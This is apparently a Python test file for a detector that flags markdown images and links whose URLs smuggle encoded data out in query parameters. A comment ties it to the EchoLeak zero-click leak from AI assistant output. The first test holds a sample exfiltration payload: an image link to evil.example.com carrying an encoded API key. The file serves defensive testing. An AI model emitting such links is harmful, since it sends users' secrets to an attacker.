import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from config.actions import detect_exfil_channel


def test_detects_auto_rendered_image_with_long_encoded_query_param():
    # The EchoLeak (CVE-2025-32711) pattern: an auto-fetched image whose URL
    # secretly carries exfiltrated data in a query parameter.
    text = "Here is your chart: ![chart](https://evil.example.com/pixel.png?data=c2VjcmV0LWFwaS1rZXktMTIzNDU2Nzg5MA)"
    findings = detect_exfil_channel(text)
    assert len(findings) == 1
    assert "evil.example.com" in findings[0]


def test_detects_plain_link_with_long_encoded_query_param():
    text = "Click [here](https://example.com/track?session=YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo)"
    findings = detect_exfil_channel(text)
    assert len(findings) == 1


def test_no_false_positive_on_simple_image_link():
    text = "Here's the chart you asked for: ![chart](https://example.com/chart.png)"
    assert detect_exfil_channel(text) == []


def test_no_false_positive_on_plain_text_with_no_links():
    text = "The current margin requirement for EUR/USD is 3.33%."
    assert detect_exfil_channel(text) == []


def test_no_false_positive_on_short_query_param():
    text = "See the report: ![report](https://example.com/r.png?id=42)"
    assert detect_exfil_channel(text) == []
